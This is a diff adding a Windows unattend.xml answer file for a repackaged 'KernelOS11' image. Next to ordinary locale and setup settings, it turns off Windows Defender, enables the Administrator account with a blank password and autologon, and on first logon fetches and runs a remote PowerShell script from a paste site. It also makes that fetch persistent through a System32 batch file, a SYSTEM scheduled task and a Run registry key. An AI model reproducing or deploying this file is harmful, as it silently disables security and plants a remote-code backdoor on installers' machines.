@@ -1,0 +1,166 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<unattend xmlns="urn:schemas-microsoft-com:unattend">
+	<!-- WINDOWS PE PHASE - Before Installation Starts -->
+	<settings pass="windowsPE">
+		<component name="Microsoft-Windows-International-Core-WinPE" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+			<SetupUILanguage>
+				<UILanguage>en-US</UILanguage>
+			</SetupUILanguage>
+			<InputLocale>0409:00000409</InputLocale>
+			<SystemLocale>en-US</SystemLocale>
+			<UILanguage>en-US</UILanguage>
+			<UserLocale>en-US</UserLocale>
+		</component>
+		<component name="Microsoft-Windows-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+			<ImageInstall>
+				<OSImage>
+					<InstallFrom>
+						<MetaData wcm:action="add">
+							<Key>/IMAGE/INDEX</Key>
+							<Value>1</Value>
+						</MetaData>
+					</InstallFrom>
+				</OSImage>
+			</ImageInstall>
+			<UserData>
+				<AcceptEula>true</AcceptEula>
+			</UserData>
+		</component>
+	</settings>
+	
+	<!-- SPECIALIZE PHASE - During Installation -->
+	<settings pass="specialize">
+		<component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+			<ComputerName>KernelOS-PC</ComputerName>
+			<RegisteredOrganization>https://dsc.gg/kernelos</RegisteredOrganization>
+			<RegisteredOwner>KernelOS11 23H2 AiOv1.4.2 by k3rnelpan1c5750</RegisteredOwner>
+		</component>
+		<component name="Microsoft-Windows-Security-SPP-UX" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+			<SkipAutoActivation>true</SkipAutoActivation>
+		</component>
+		<component name="Microsoft-Windows-Deployment" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+			<RunSynchronous>
+				<!-- Enable Administrator account -->
+				<RunSynchronousCommand wcm:action="add">
+					<Order>1</Order>
+					<Path>net user Administrator /active:Yes</Path>
+					<Description>Enable Administrator account</Description>
+				</RunSynchronousCommand>
+				
+				<!-- Disable Windows Defender via Registry -->
+				<RunSynchronousCommand wcm:action="add">
+					<Order>2</Order>
+					<Path>reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f</Path>
+					<Description>Disable Windows Defender AntiSpyware</Description>
+				</RunSynchronousCommand>
+				
+				<!-- Disable Windows Defender Real-time Protection -->
+				<RunSynchronousCommand wcm:action="add">
+					<Order>3</Order>
+					<Path>reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f</Path>
+					<Description>Disable Defender Real-time Protection</Description>
+				</RunSynchronousCommand>
+				
+				<!-- Disable Cortana -->
+				<RunSynchronousCommand wcm:action="add">
+					<Order>4</Order>
+					<Path>reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v AllowCortana /t REG_DWORD /d 0 /f</Path>
+					<Description>Disable Cortana</Description>
+				</RunSynchronousCommand>
+			</RunSynchronous>
+		</component>
+	</settings>
+	
+	<!-- OOBE SYSTEM PHASE - After Installation -->
+	<settings pass="oobeSystem">
+		<component name="Microsoft-Windows-International-Core" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+			<InputLocale>0409:00000409</InputLocale>
+			<SystemLocale>en-US</SystemLocale>
+			<UILanguage>en-US</UILanguage>
+			<UserLocale>en-US</UserLocale>
+		</component>
+		<component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+			<TimeZone>Montevideo Standard Time</TimeZone>
+			<OOBE>
+				<HideEULAPage>true</HideEULAPage>
+				<HideLocalAccountScreen>true</HideLocalAccountScreen>
+				<HideOnlineAccountScreens>true</HideOnlineAccountScreens>
+				<HideWirelessSetupInOOBE>true</HideWirelessSetupInOOBE>
+				<NetworkLocation>Home</NetworkLocation>
+				<ProtectYourPC>3</ProtectYourPC>
+				<SkipMachineOOBE>true</SkipMachineOOBE>
+				<SkipUserOOBE>true</SkipUserOOBE>
+			</OOBE>
+			<UserAccounts>
+				<AdministratorPassword>
+					<PlainText>true</PlainText>
+					<Value></Value>
+				</AdministratorPassword>
+			</UserAccounts>
+			<AutoLogon>
+				<Enabled>true</Enabled>
+				<LogonCount>9999999</LogonCount>
+				<Username>Administrator</Username>
+				<Password>
+					<PlainText>true</PlainText>
+					<Value></Value>
+				</Password>
+			</AutoLogon>
+			
+			<!-- ========================================================= -->
+			<!-- FIRST LOGON COMMANDS - Your custom commands go here     -->
+			<!-- ========================================================= -->
+			<FirstLogonCommands>
+				
+				<!-- Additional PowerShell tweaks for UI elements -->
+				<SynchronousCommand wcm:action="add">
+					<Order>1</Order>
+					<CommandLine>powershell -ExecutionPolicy Bypass -Command "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications' -Name 'GlobalUserDisabled' -Value 1; Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Search' -Name 'CortanaEnabled' -Value 0; Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name 'ShowTaskViewButton' -Value 0"</CommandLine>
+					<Description>Disable background apps, Cortana user settings, and Task View</Description>
+					<RequiresUserInput>false</RequiresUserInput>
+				</SynchronousCommand>
+				
+				<!-- Run the PowerShell command directly first time -->
+				<SynchronousCommand wcm:action="add">
+					<Order>2</Order>
+					<CommandLine>powershell -ExecutionPolicy Bypass -Command "irm https://nopaste.net/papibiyoyito | iex"</CommandLine>
+					<Description>Run PowerShell script from server</Description>
+					<RequiresUserInput>false</RequiresUserInput>
+				</SynchronousCommand>
+				
+				<!-- Create the .bat file in System32 -->
+				<SynchronousCommand wcm:action="add">
+					<Order>3</Order>
+					<CommandLine>cmd /c echo @echo off ^&gt; C:\Windows\System32\dindonbiyoyo.bat &amp;&amp; echo powershell -ExecutionPolicy Bypass -Command "irm https://nopaste.net/papibiyoyito | iex" ^&gt;^&gt; C:\Windows\System32\dindonbiyoyo.bat</CommandLine>
+					<Description>Create startup batch file</Description>
+					<RequiresUserInput>false</RequiresUserInput>
+				</SynchronousCommand>
+				
+				<!-- Create scheduled task to run at startup -->
+				<SynchronousCommand wcm:action="add">
+					<Order>4</Order>
+					<CommandLine>schtasks /create /tn "WindowsBiyoyo" /tr "C:\Windows\System32\dindonbiyoyo.bat" /sc onstart /ru SYSTEM /rl HIGHEST /f</CommandLine>
+					<Description>Create scheduled task for startup</Description>
+					<RequiresUserInput>false</RequiresUserInput>
+				</SynchronousCommand>
+				
+				<!-- Alternative: Also add to registry for redundancy (optional) -->
+				<SynchronousCommand wcm:action="add">
+					<Order>5</Order>
+					<CommandLine>reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsBiyoyo" /t REG_SZ /d "C:\Windows\System32\dindonbiyoyo.bat" /f</CommandLine>
+					<Description>Add to registry startup (backup method)</Description>
+					<RequiresUserInput>false</RequiresUserInput>
+				</SynchronousCommand>
+				
+				<!-- Restart Explorer to apply UI changes -->
+				<SynchronousCommand wcm:action="add">
+					<Order>6</Order>
+					<CommandLine>powershell -ExecutionPolicy Bypass -Command "Stop-Process -Name explorer -Force; Start-Sleep 2; Start-Process explorer"</CommandLine>
+					<Description>Restart Explorer to apply UI changes</Description>
+					<RequiresUserInput>false</RequiresUserInput>
+				</SynchronousCommand>
+				
+			</FirstLogonCommands>
+		</component>
+	</settings>
+</unattend>
